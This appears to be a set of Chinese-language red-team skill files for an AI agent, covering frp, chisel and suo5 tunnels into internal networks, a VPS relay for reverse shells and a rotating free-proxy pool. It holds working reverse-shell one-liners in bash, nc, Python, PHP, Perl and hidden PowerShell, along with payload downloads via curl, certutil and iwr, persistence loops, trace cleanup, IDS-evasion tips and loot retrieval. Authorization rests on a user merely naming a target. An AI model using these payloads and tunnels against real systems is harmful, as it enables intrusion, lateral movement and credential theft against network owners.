# redteam-tunnel


---

## frp-tunnel

# frp（内网穿透，最稳的长期隧道）

> **先加载 VPS 配置**：本技能里所有 `$REDTEAM_VPS_HOST` / `$VPS_USER` 都来自本机配置，
> 首次由 `bash $DSH_HOME/redteam/setup.sh` 写入 `$DSH_HOME/.env`。每条命令前先 source 一次：
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> 没配过就跑一次 `setup.sh`（技能 `redteam-setup`），它同时会验证 SSH 连通性与载荷服务。

`frp` 是**最稳定、最常用**的穿透方案：VPS 上跑 `frps`（服务端），目标上跑 `frpc`（客户端），
把内网的 socks5 或任意端口映射出来。相比 suo5/chisel，它**专为长期稳定运行设计**（自动重连、多路复用、TLS），
适合打进去之后**长期挂着**的内网通道。

**分工**：有 WebShell → `suo5-tunnel`；只有命令执行要快速进内网 → `chisel-tunnel`；
要**长期稳定 + 把端口给用户直接用** → 本技能。

## 本机二进制

| 文件 | 路径 | 用途 |
| --- | --- | --- |
| frps | `$DSH_HOME/redteam/toolkit/frp/frps` | VPS 上的服务端 |
| frpc | `$DSH_HOME/redteam/toolkit/frp/frpc` | 目标上的客户端 |

已同步到 VPS 载荷目录 `http://$REDTEAM_VPS_HOST:9100/`。VPS 上还有 `frps` 的配置样例。

## 一、VPS 侧：起 frps（先做）

```bash
# 1) 上传并准备（本机 → VPS）
scp -i $DSH_HOME/redteam/toolkit/vps/id_rsa \
    $DSH_HOME/redteam/toolkit/frp/frps $VPS_USER@$REDTEAM_VPS_HOST:/root/frps

# 2) 写配置（VPS 上）
cat > /root/frps.toml <<'EOF'
bindPort = 7000                 # frpc 连接端口
auth.method = "token"
auth.token = "<随机强 token>"   # 必填：公网暴露必须加 token，否则被扫到白用

# 可选：vhostHTTPPort / vhostHTTPSPort 用于 HTTP 类型穿透
EOF

# 3) tmux 里跑（断开 SSH 也不能死）
tmux new -s frps
/root/frps -c /root/frps.toml
```

**VPS 安全组放行**：`7000`（frpc 连接口）+ 后续映射出来的端口（如 `1080`、`13389`）。

## 二、目标侧：跑 frpc

```bash
# 1) 拉取二进制（通过已有命令执行点）
curl -s http://$REDTEAM_VPS_HOST:9100/frpc -o /tmp/frpc && chmod +x /tmp/frpc

# 2) 写配置
cat > /tmp/frpc.toml <<'EOF'
serverAddr = "$REDTEAM_VPS_HOST"
serverPort = 7000
auth.method = "token"
auth.token = "<与 frps 相同的 token>"

# ① 内网 SOCKS5（最有用：整个内网可达）
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080
[proxies.plugin]
type = "socks5"

# ② 指定端口映射（例：内网 RDP → VPS 13389）
# [[proxies]]
# name = "rdp"
# type = "tcp"
# localIP = "10.0.0.5"
# localPort = 3389
# remotePort = 13389

# ③ 可选：HTTP 类型（走 80/443 出网受限时配合 frps 的 vhostHTTPPort）
# [[proxies]]
# name = "web"
# type = "tcp"
# localIP = "10.0.0.6"
# localPort = 8080
# remotePort = 18080
EOF

# 3) 后台常驻跑（nohup + 断线自动重连）
nohup /tmp/frpc -c /tmp/frpc.toml > /tmp/frpc.log 2>&1 &
# Windows 目标：frpc.exe -c C:\Windows\Temp\frpc.toml（可用 sc create 注册服务持久化）
```

## 三、本机使用隧道

```bash
# SOCKS5 模式：VPS:1080 就是内网入口
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
# 配置里写：socks5 $REDTEAM_VPS_HOST 1080
# ⛔ 不要改 /etc/proxychains4.conf，用 -f 指向 runs/ 下临时配置

# 端口映射模式：直连 VPS 端口
rdesktop $REDTEAM_VPS_HOST:13389
mysql -h $REDTEAM_VPS_HOST -P 13306 -u root -p
```

## 四、出网受限时的变体

| 限制 | 处理 |
| --- | --- |
| 只能出 80/443 | frps `bindPort = 443`（或先用 80 跑 HTTP 类型），frpc 对应改端口 |
| 有 TLS 中间盒拦截 | frp 自带 `transport.tls.enable = true`（默认开）；必要时用 `transport.protocol = "kcp"` 或 `websocket` |
| 目标不能出网 | frp 方案不可用 → 走 WebShell 侧隧道（`suo5-tunnel`） |
| 需要伪装成正常流量 | `transport.protocol = "websocket"` + `transport.tls.enable = true`（走 443 时像普通 WebSocket） |

## 五、持久化与纪律

1. **必须跑在 tmux（服务端）/ nohup（客户端）**，否则会话一断隧道即失。
2. **服务端必须加 `auth.token`**：公网 VPS 的 7000 端口会被全网扫，无 token 等于把内网送人。
3. **token 不要复用**：每次演练生成新的随机 token；用完 `pkill frps` / `pkill frpc` 及时关闭。
4. **目标侧注意落地痕迹**：二进制与配置放 `/tmp`，用完清理；Windows 用 `Temp` 目录。
5. **不要用它做非法用途**：本技能仅限授权演练（用户给出靶标即代表已授权）。

## 六、输出与落库（强制）

1. **隧道登记 `（技能记录：tunnel_add）`**，字段写全：
   - `kind`：`frp`；
   - `listen`：用户实际使用的地址（如 `$REDTEAM_VPS_HOST:1080`）；
   - `entry`：目标侧入口（如 `10.0.0.6 上 /tmp/frpc → VPS:7000`）；
   - `reach`：**实测可达网段**；
   - `entry_kind`：**`target-outbound`**（目标出网连我们的 frps——这是 frp 的典型形态）；
     ⛔ 只在自己 VPS 上开代理填 `self-only` → 会被标"不算突破"；
   - `command`：frps 与 frpc 两段完整命令 + 配置要点（token 脱敏）。
2. **实测连通**：`curl --socks5-hostname $REDTEAM_VPS_HOST:1080 http://<内网目标>/`，通了才登记为 active；
   然后 `（技能记录：session_check）` 复查。
3. **得分**：`boundary`（隧道可达内网，evidence 写「隧道地址｜可达网段｜实测访问到的内网目标」）；
   通过它横向 → `server-host`。
4. **交付给用户**：给出可直接粘贴的 `socks5://$REDTEAM_VPS_HOST:1080` 或映射端口，写清地址与端口。
5. 每个关键动作 `（技能记录：chain_add）`（`stage_code=boundary-logical`），`tool` 写命令原文、`result` 写回显摘要
   （如 `frpc 注册成功，proxy socks5 start success`）。

---

## chisel-tunnel

# chisel（HTTP 隧道 / 端口转发）

> **先加载 VPS 配置**：本技能里所有 `$REDTEAM_VPS_HOST` / `$VPS_USER` 都来自本机配置，
> 首次由 `bash $DSH_HOME/redteam/setup.sh` 写入 `$DSH_HOME/.env`。每条命令前先 source 一次：
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> 没配过就跑一次 `setup.sh`（技能 `redteam-setup`），它同时会验证 SSH 连通性与载荷服务。

`chisel` 把 TCP 流量封进 **HTTP/WebSocket**，因此**最容易穿过只放行 80/443 的出网策略与反向代理**。
它和 suo5 的分工：

| | suo5 | chisel |
| --- | --- | --- |
| 入口前提 | **必须有 WebShell**（HTTP 通道） | **只要有命令执行**（能跑二进制即可） |
| 传输 | HTTP 长连接（伪装成正常请求） | HTTP/WebSocket（upgrade） |
| 强项 | 从 Web 入口进内网，用户可复用 | 从 shell/RCE 入口进内网；端口转发灵活 |
| 噪声 | 低（像普通 Web 请求） | 低-中（WebSocket 特征明显些） |

**选择口径**：有 WebShell → 优先 `suo5-tunnel`；只有命令执行/RCE 或需要精确端口转发 → 用 chisel。

## 本机二进制

| 文件 | 路径 |
| --- | --- |
| chisel（Linux amd64，服务端与客户端同一个二进制） | `$DSH_HOME/redteam/toolkit/chisel/chisel`（v1.12.0） |

已同步到 VPS 载荷目录：`http://$REDTEAM_VPS_HOST:9100/`（目标可 `curl` 直接拉）。

## 一、反向 SOCKS（最常用：目标主动连我们）

```bash
# 1) 我方 VPS 起服务端（tmux 里跑，别让 SSH 断开杀掉）
tmux new -s chisel
$DSH_HOME/redteam/toolkit/chisel/chisel server -p 9443 --reverse --socks5
#    --reverse  允许客户端注册反向隧道
#    --socks5   开启内置 SOCKS5（客户端连上后该端口即可用）
#    可选加固：--auth user:pass   加认证，避免被扫到白用
#    可选伪装：--backend http://127.0.0.1:80  把 Web 流量转发到本地站点

# 2) 目标侧起客户端（通过已有的 RCE/命令执行点跑；先把二进制拉上去）
curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c
/tmp/c client $REDTEAM_VPS_HOST:9443 R:socks
#    R:socks = 反向 SOCKS；连上后 VPS 的 1080 端口即为内网 SOCKS5 入口

# 3) 本机通过 VPS 的 SOCKS 访问内网
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
#    runs/proxychains-1080.conf 里写：socks5 $REDTEAM_VPS_HOST 1080
#    ⛔ 不要改系统 /etc/proxychains4.conf，用 -f 指向 runs/ 下的临时配置
```

## 二、反向端口转发（把内网某个端口映射出来）

```bash
# 目标侧：把内网 10.0.0.5:3389 映射到 VPS 的 13389
/tmp/c client $REDTEAM_VPS_HOST:9443 R:13389:10.0.0.5:3389
# 本机：直接连 VPS:13389 即为内网 3389
rdesktop $REDTEAM_VPS_HOST:13389
```

## 三、正向 SOCKS（目标能直连我们、但我们要主动连目标内网）

```bash
# 目标侧起服务端
/tmp/c server -p 9443 --socks5
# 我方起客户端做本地转发
chisel client <target>:9443 1080:socks
# 之后 proxychains 指向 127.0.0.1:1080
```

## 四、多级 / 联动

```bash
# 已有 A 隧道（suo5 → 127.0.0.1:1080），要通过 A 在内网主机 B 上再起 chisel
proxychains4 -f runs/proxychains-1080.conf \
  ssh user@10.0.0.6 "curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c && nohup /tmp/c client $REDTEAM_VPS_HOST:9443 R:socks2 &"
# 逐层扩大可达范围，每层都要登记隧道与可达网段
```

## 五、纪律与自保

1. **必须跑在 tmux / nohup 里**：会话断开隧道就没了（`nohup ... &` 或 `tmux`）。
2. **服务端加认证**：公网 VPS 上的 chisel 服务端会被扫端口，加 `--auth user:pass`，用完 `pkill` 关掉。
3. **端口选择**：别用 80/443（可能被 VPS 上别的服务占用），用 9443/8443 等高位端口；
   **VPS 安全组要放行**。
4. **目标侧落地要清理痕迹与文件**：`/tmp/c` 用完可删；注意别把二进制放在有明显特征的路径。
5. **不要用自建 VPS 上的代理冒充"突破"**：隧道登记 `entry_kind` 必须说清目标侧那一端（见下）。

## 六、输出与落库（强制）

1. **隧道登记 `（技能记录：tunnel_add）`**，字段必须写全：
   - `kind`：`chisel`；
   - `listen`：**用户实际能用的监听地址**（如 `$REDTEAM_VPS_HOST:1080` 或 `127.0.0.1:1080`）；
   - `entry`：目标侧的入口（如 `10.0.0.6 上的 /tmp/c 客户端 → VPS:9443`）；
   - `reach`：**可达网段**（如 `10.0.0.0/24`，实测出来再填，别猜）；
   - `entry_kind`：**必须是 `target-outbound`**（目标反弹/目标上跑 chisel 客户端）或
     `target-http`（经目标 WebShell）、`target-agent`（经目标已控进程）；
     ⛔ 只在自己 VPS 上开代理填 `self-only`——**会被标"不算突破"**；
   - `command`：完整命令原文（服务端 + 客户端两段都要）。
2. **实测连通性**：`curl --socks5-hostname <listen> http://<内网目标>/` 或 `proxychains4 -f ... curl ...`，
   通了才算隧道成立；然后 `（技能记录：session_check）` 回写状态。
3. **得分**：隧道可达内网 → `（技能记录：score_hit）`（`boundary`，evidence 写「隧道地址｜可达网段｜实测访问到的内网目标」）；
   通过它横向到其它主机 → `server-host`。
4. **交付给用户**：给出可直接粘贴的配置——`socks5://<listen>`（或 `ssh -D` / frp 映射到用户机器的方法），
   写清监听地址与端口，并说明该隧道跨越了靶标边界。
5. 每个关键动作 `（技能记录：chain_add）`（`stage_code=boundary-logical`），`tool` 写命令原文、`result` 写回显摘要。

---

## suo5-tunnel

# suo5 内网隧道

> **打进内网的标准通道只有这一条**：拿到 WebShell/RCE 后**必须**先用 suo5 建 socks5 隧道，
> 把隧道登记进库（`（技能记录：tunnel_add）` kind=suo5）并用 `（技能记录：session_check）` 验证真的通，
> 然后才谈内网测绘与横向。**没有隧道就不要手搓内网探测脚本**——手搓既慢又容易把入口打死。
> 隧道入口的 WebShell 必须是冰蝎马/哥斯拉马（见技能 `webshell-toolkit`），否则用户无法复用。

二进制：`$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64`（v2.2.0，静态 Go，无依赖）

## 建立隧道
```bash
SUO5=$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64

# 1) 用 WebShell 作为隧道端点（HTTP 型）
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 -m socks5

# 2) 需要认证时
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 --auth user:pass

# 3) 只走 HTTP 代理（部分工具只支持 http proxy）
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:8081 -m http
```
参数速查：`-t` 目标 shell URL、`-l` 本地监听、`-m socks5|http`、`--auth user:pass`、`-r` 重连间隔、`--debug` 看流量。

## 通过隧道做内网操作
```bash
# curl 走 socks5
curl -s --socks5 127.0.0.1:1080 http://10.0.0.5:8080/ -I

# nmap 必须用 -sT（全连接）+ proxychains，或直接 --proxies（新版）
proxychains4 -q nmap -sT -Pn -p 22,80,445,3389,3306,6379,8080 10.0.0.0/24 -oN runs/internal-nmap.txt

# 数据库 / 中间件
proxychains4 -q redis-cli -h 10.0.0.6 -p 6379 info
proxychains4 -q mysql -h 10.0.0.7 -u root -p --connect-timeout=5

# 浏览器/接口测试走隧道
curl -s --socks5 127.0.0.1:1080 "http://10.0.0.8:8080/api/user/1" -H "Cookie: JSESSIONID=..."
```

## 内网扫描节奏（避免告警）
- 先 `/24` 存活探测（`nmap -sn` 经隧道或 ICMP），再对存活主机做常见端口。
- 速率降到 `-T2 --max-rate 50`，避免 IDS 触发。
- 新发现的资产全部 `（技能记录：asset_add）`（会自动按 /24 建 C 段），并标 `provenance="active"`、`tool="suo5+nmap"`。

## 落库
- **建好立刻登记（强制）**：`（技能记录：tunnel_add）`（`kind=suo5`、`listen=127.0.0.1:1080`、`entry=<WebShell URL>`、`reach=可达网段`、`command=完整启动命令`），`webshell_id` 指向对应的 WebShell 记录；随后 `（技能记录：session_check）` 实测连通性，确认 status=active 再往下走。
- 隧道本身写 `（技能记录：chain_add）`（stage=pivot，detail 写隧道端点与本地端口）。
- 每个内网资产、每次成功登录、每条凭据分别落库（asset/access/credential）。
- 隧道掉了用 `（技能记录：tunnel_update）` 标 down；不要留一个"看起来在跑其实不通"的隧道给后续角色踩空。

## 注意事项
- 隧道端点文件用完后按需清理，恢复目标原状。
- 免费公网代理不适合承载隧道；suo5 走的是目标自身的 WebShell，不需要额外代理。
- 只在授权范围内使用。

---

## vps-reverse-shell

# VPS 中转与反弹 Shell（<你的VPS_IP>）

自建公网 VPS 作为**反弹 Shell 落地端 + 载荷投递点 + 内网中转跳板**。目标只需要能访问互联网，
把 shell 弹到 VPS 的 9000-9999 端口；智能体通过 tmux 会话**非交互地**下发命令并读回输出。

## 何时用 / 何时不用

| 场景 | 选择 |
| --- | --- |
| 目标能直连本机（同网段、有公网 IP） | 直接本机监听，**不必**用 VPS |
| 目标只能出网、本机在内网（NAT 后） | ✅ 用 VPS，这是主场景 |
| 目标是云主机/容器，出网受限但能出 80/443 | ✅ 用 VPS 的 9000-9999（若被限制就用 443/80 类端口，见排障） |
| 只需要跑一条命令拿结果 | 优先用 Web 漏洞/RCE 的 HTTP 通道，比反弹 shell 更稳更隐蔽 |

## 资产与凭据

```
主机    : <你的VPS_IP>（腾讯云，Ubuntu 24.04，2C2G，主机名 <VPS 主机名>）
用户    : ubuntu（sudo 免密）
私钥    : ~/.dsh/redteam/toolkit/vps/id_rsa          ← 权限 600，不要复制进仓库/聊天
可用端口: 9000-9999                                   ← 云安全组只放了这一段
工具脚本: ~/.dsh/redteam/toolkit/vps/vps.sh
```

**密钥纪律**：私钥只在上面这个路径。任何情况下不要把私钥内容写进技能文件、报告、仓库或对话。

已长期占用的端口：**9001 / 9007 / 9009（还有其他 9008 等临时服务）**，另有 tmux 会话 `cap / sh / up / www`。
**这些不是本次演练的，不要 kill、不要覆盖。**

## 快速开始

```bash
VPS=~/.dsh/redteam/toolkit/vps/vps.sh

$VPS status                 # 看 VPS 状态、剩余端口、现有会话
$VPS listen                 # 自动挑一个空闲端口开监听（也可 $VPS listen 9000）
# → 拿到端口后，用目标上的漏洞执行反弹命令（见下一节）
$VPS send 9000 'id; uname -a'      # 目标回连后，下发命令
$VPS read 9000 60                  # 读回输出
$VPS kill 9000                     # 用完必须清理
```

`listen` 用 tmux + rlwrap + **自动重听循环**：连接断了会自动重新监听，适合反复触发。

## 工具用法（vps.sh）

| 子命令 | 作用 |
| --- | --- |
| `status` | VPS 身份、系统、工具就绪情况、9000-9999 占用、tmux 会话 |
| `port` | 自动返回一个 9000-9999 内的空闲端口 |
| `listen [port]` | 开持久监听（省略端口则自动选），打印目标侧命令模板 |
| `sessions` | 列出 VPS 上的 tmux 会话 |
| `send <port> '<cmd>'` | **把命令下发进已上线的反弹 Shell**（智能体主用） |
| `read <port> [行数]` | 读回该会话最近输出（默认 200 行） |
| `watch <port>` | 持续刷新输出（人看） |
| `attach <port>` | 本机 tmux 接管会话（人用，`Ctrl-B D` 退出） |
| `kill <port>` | 关闭监听 + 清理会话 + 释放端口 |
| `serve [port] [dir]` | VPS 上起 HTTP 服务，供目标下载载荷（默认 9008） |
| `push <本地> [远端]` | 上传文件到 VPS |
| `get <远端> [本地]` | 从 VPS 取回文件（把目标产物拉回来） |
| `sh '<命令>'` | 在 VPS 上直通执行任意命令 |

环境变量可覆盖：`VPS_HOST`、`VPS_KEY`。

## 目标侧反弹 payload（端口换成你 listen 的那个）

```bash
# Bash（最常用）
bash -c 'bash -i >& /dev/tcp/<你的VPS_IP>/9000 0>&1'
bash -c 'exec bash -i &>/dev/tcp/<你的VPS_IP>/9000 <&1'

# nc 系（有 -e 的版本）
nc <你的VPS_IP> 9000 -e /bin/bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <你的VPS_IP> 9000 > /tmp/f

# Python（无 nc 时的兜底，兼容 python2/3）
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<你的VPS_IP>",9000));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'

# PHP（Web 侧 getshell 后常用）
php -r '$s=fsockopen("<你的VPS_IP>",9000);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="<你的VPS_IP>";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Windows PowerShell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<你的VPS_IP>',9000);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

**URL 编码**：走 Web 漏洞（命令注入/RCE）时把 payload 整体 URL 编码后再传参，避免 `&`、`>` 被截断。

## 会话升级与稳定化

裸 `nc` 出来的 shell 没有 TTY：不能 `sudo`、不能 `su`、`vi` 和 `top` 会异常。升级：

```bash
# 目标上执行（python3 必装率最高）
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 或
script -qc /bin/bash /dev/null
```

```bash
# 本机侧（attach 后）让 Ctrl-C/方向键正常
# 在反弹 shell 里依次：Ctrl-Z
stty raw -echo; fg
# 回车两次，然后
export TERM=xterm; export SHELL=/bin/bash; stty rows 40 cols 160
```

**更稳的方案：socat 全 TTY 监听**（VPS 上已装 socat）：

```bash
$VPS sh "tmux new-session -d -s rt-pty -t '' 'socat file:\`tty\`,raw,echo=0 tcp-listen:9000,reuseaddr'"
# 目标侧
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<你的VPS_IP>:9000
```

掉线自动重连（目标侧循环）：

```bash
while true; do bash -c 'bash -i >& /dev/tcp/<你的VPS_IP>/9000 0>&1'; sleep 10; done &
```

## 载荷投递（VPS 当文件中转）

```bash
$VPS serve 9100 ~/rt/payloads        # VPS 上起 HTTP 服务
$VPS push ./suo5 /home/ubuntu/rt/payloads/
# 目标侧（Linux）
curl -O http://<你的VPS_IP>:9100/suo5  或  wget http://<你的VPS_IP>:9100/suo5
# 目标侧（Windows）
certutil -urlcache -split -f http://<你的VPS_IP>:9100/beacon.exe C:\Windows\Temp\a.exe
powershell -c "iwr http://<你的VPS_IP>:9100/beacon.exe -OutFile C:\Windows\Temp\a.exe"
```

**取回战利品**：`$VPS get /home/ubuntu/rt/loot/dump.zip ~/.dsh/redteam/engagements/<靶标>/runs/`

## 反向隧道与中转

目标在内网、本机不可达时，用 VPS 当跳板：

```bash
# 反向隧道：VPS:9200 → 目标内网 10.0.0.5:8080（在目标上执行）
ssh -R 9200:10.0.0.5:8080 -N -f -o StrictHostKeyChecking=no -i <目标上的密钥> ubuntu@<你的VPS_IP>
# 之后本机经 VPS 访问：ssh -L 8080:127.0.0.1:9200 ubuntu@<你的VPS_IP>

# socat 端口转发（VPS 上）
$VPS sh "tmux new-session -d -s fwd-9200 'socat TCP-LISTEN:9200,reuseaddr,fork TCP:10.0.0.5:8080'"
```

WebShell 场景配合技能 `suo5-tunnel`：把 suo5 客户端放本机，服务端传到目标，隧道出口经 VPS 更稳。

## 纪律（务必遵守）

1. **端口纪律**：只用 9000-9999，开监听前先 `$VPS port` 或 `$VPS status` 确认空闲；**绝不占用/杀掉 9001、9007、9009 与 `cap/sh/up/www` 会话**。
2. **每次用完必须 `$VPS kill <port>`**，不要留下裸监听（既是资源占用也是痕迹）。
3. **凭据落库、不留 VPS**：目标上抓到的口令/哈希用 `（技能记录：credential_add）` 写进本机资产库（明文 `secret_value`），产物落本机 `runs/`；**不要把凭据写进 VPS 家目录**。
4. **VPS IP 对目标可见**：它属于本次演练的基础设施，不要在目标上留下包含它之外的额外个人信息。
5. **落库**：每次成功拿到 shell 用 `（技能记录：access_add）` 记录（host/账号/方式/权限/会话引用），每条凭据用 `（技能记录：credential_add）` 记录，攻击脚本用 `（技能记录：attack_file_add）` 归档。
6. **`send` 出去的每条命令都要能从 `read` 的输出里拿到证据**，重要输出先重定向到文件再 `get` 回来，避免 tmux 回滚缓冲被刷掉。

## 排障

| 现象 | 处理 |
| --- | --- |
| 目标回连不上 | 先确认监听真在：`$VPS sessions` + `$VPS sh "ss -ltnp \| grep <port>"`；再确认目标出网（目标上 `curl -s http://<你的VPS_IP>:<port>` 若返回连接成功说明端口可达） |
| 端口在范围外/换端口 | 云安全组只放了 9000-9999，超范围必失败 |
| 反复掉线 | 目标侧加 `while true` 重连循环；或用 socat 全 TTY 方案 |
| 有回显但命令不执行 | payload 被 URL 截断（`&`/`>`），整体 URL 编码 |
| 中文乱码 | 目标上 `export LANG=C.UTF-8`，或先 `read` 前把 tmux 设置 `tmux set -t rt-<port> utf8 on` |
| 无 TTY、`sudo` 报错 | 升级 PTY（见上） |
| 本机探测端口"全部可连" | 本机网关会对任意端口回 SYN-ACK，**本机 `nc -z` 不能判断 VPS 端口可达性**；要用外部节点或目标本身验证 |

## 与其他技能的关系

- `suo5-tunnel`：WebShell → SOCKS5 隧道，出口可以走本 VPS
- `webshell-toolkit`：冰蝎/哥斯拉/蚁剑，拿到 WebShell 后的管理
- `cn-proxy-pool`：需要国内出口 IP 时叠加代理（不要改动本机网络配置）
- `active-scan` / `fofa-recon`：内网可达后继续测绘

---

## cn-proxy-pool

# 国内免费 IP 代理池

免费代理不稳定，定位是**降低被封风险**而不是隐藏身份。关键目标优先用自有出口或 suo5 隧道。

## ⛔ 铁规则：不许动本机的网络与代理配置

使用代理**只允许在单条命令上临时指定**，任何情况下都不要修改本机配置。以下操作一律禁止：

| 禁止 | 说明 |
|---|---|
| 设系统代理 | GNOME/KDE 网络设置、`gsettings set org.gnome.system.proxy …`、`networksetup -setwebproxy`、Windows `netsh winhttp set proxy` |
| 写全局环境变量 | 修改 `/etc/environment`、`/etc/profile`、`/etc/profile.d/*`、`~/.bashrc`、`~/.bash_profile`、`~/.profile`、`~/.zshrc` 里的 `http_proxy` / `https_proxy` / `all_proxy` / `no_proxy` |
| 改工具全局配置 | `~/.curlrc`、`~/.wgetrc`、`~/.npmrc`、`/etc/apt/apt.conf.d/*proxy*`、`/etc/pip.conf`、`~/.docker/config.json`、`~/.gitconfig` 的 proxy 项 |
| 改 proxychains 全局配置 | 不修改 `/etc/proxychains4.conf`、`~/.proxychains/proxychains.conf`；确需用时用 `-f` 指向 `runs/` 下的临时配置，用完删除 |
| 动系统网络 | iptables/nftables 规则、路由表、DNS（`/etc/resolv.conf`）、NetworkManager、起停 VPN/tun 设备 |
| 持久化 export | 不在 shell 里 `export http_proxy=…` 让它留在会话里；要传就**内联**在该条命令前 |

**正确姿势**（全部是命令级、一次性的）：

```bash
P=$(shuf -n1 runs/live-proxies.txt)

# 方式一：工具自带的代理参数（首选）
curl -s --proxy "http://$P" --max-time 15 -I "https://target.example.com/"
nuclei -u https://target.example.com/ -proxy "http://$P" -rate-limit 20
sqlmap -u "https://target.example.com/item?id=1" --proxy="http://$P" --batch --random-agent
ffuf -u https://target.example.com/api/FUZZ -w wordlist.txt -x "http://$P" -rate 20

# 方式二：只对这条命令内联环境变量（不 export，进程结束即失效）
http_proxy="http://$P" https_proxy="http://$P" curl -s --max-time 15 "https://target.example.com/"

# 方式三：只支持原始 TCP 的工具 → 用 suo5 SOCKS5 隧道（技能 suo5-tunnel），
#        不要为它去改系统代理；proxychains 用临时配置文件：
proxychains4 -f runs/proxychains.tmp.conf -q nmap -sT -Pn -p 80,443 10.0.0.5
```

## 一、抓取（多源合并）
```bash
mkdir -p runs && cd runs
curl -s --max-time 20 "https://www.89ip.cn/tqdl.html?api=1&num=50&port=&address=%E4%B8%AD%E5%9B%BD&isp=" \
  | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]{2,5}' >> raw-proxies.txt
curl -s --max-time 20 "http://www.ip3366.net/free/?stype=1" \
  | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}</td>[[:space:]]*<td>[0-9]{2,5}' \
  | sed -E 's#</td>[[:space:]]*<td>#:#' >> raw-proxies.txt
curl -s --max-time 20 "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/countries/CN/data.txt" \
  | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]{2,5}' >> raw-proxies.txt
sort -u raw-proxies.txt -o raw-proxies.txt && wc -l raw-proxies.txt
```

## 二、验证（并发测活，留下能用的）
```bash
cat > runs/check_proxy.py <<'PY'
import concurrent.futures, sys, urllib.request
TARGET = "http://www.baidu.com"   # 仅测连通性，不携带任何敏感数据
def ok(proxy):
    try:
        op = urllib.request.build_opener(urllib.request.ProxyHandler({"http": "http://" + proxy, "https": "http://" + proxy}))
        with op.open(TARGET, timeout=6) as r:
            return proxy if r.status == 200 else None
    except Exception:
        return None
with open(sys.argv[1]) as f:
    cands = [l.strip() for l in f if l.strip()]
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
    for res in ex.map(ok, cands):
        if res: print(res, flush=True)
PY
python3 runs/check_proxy.py runs/raw-proxies.txt > runs/live-proxies.txt
wc -l runs/live-proxies.txt
```

## 三、轮换与限速
- 每个请求随机取一个代理；失败自动剔除并换下一个。
- 目标侧仍要限速（`-rate-limit` / `--delay`），代理只是换出口 IP，不是加速器。
- 记录每个出口 IP 的成败，同一目标连续 3 次被封就按漏洞检测提示词里的规则**放弃该目标**。

## 四、注意事项
- **不要通过免费代理传输凭据、Cookie、上传的 shell**——免费代理可能记录流量。
- 测活只测连通性，不要用真实业务请求去测。
- 高频爆破前确认目标没有账号锁定策略；触发锁定前主动停手。
- 用完清掉 `runs/` 下的临时配置（如 `proxychains.tmp.conf`），不要在系统里留下任何代理痕迹。
- 仅在授权演练范围内使用。